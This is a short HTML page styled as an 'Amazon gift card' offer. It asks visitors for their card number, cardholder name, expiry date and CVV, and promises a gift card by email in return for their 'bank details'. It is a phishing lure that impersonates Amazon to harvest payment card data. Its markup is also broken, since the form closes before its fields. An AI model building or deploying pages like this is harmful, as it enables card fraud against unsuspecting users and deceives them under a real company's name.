<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <body>

    <h2>AMAZON GIFT CARD</h2>

    <form action="/process-payment" method="post"></form>
        <label for="cardNumber"> Card Number:</label>
        <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required><br>

        <label for="cardName">Cardholder's Name:</label>
        <input type="text" id="cardName" name="cardName" placeholder="John Doe" required><br>

        <label for="expiryDate">Expiry Date:</label>
        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required><br>

        <label for="cvv">CVV:</label>
        <input type="text" id="cvv" name="cvv" placeholder="123" required><br>

        <input type="submit" value="Submit">

    </form>
    
    <img style="width: 20px;height: 30px;" src="thumbs.png" alt="thumbs up">

    <p>You will receive your gift card in your email. The only requirements is that you fill in you bank details !!</p>

    <p>It will only take you a few seconds !</p>

    </body>
</html>
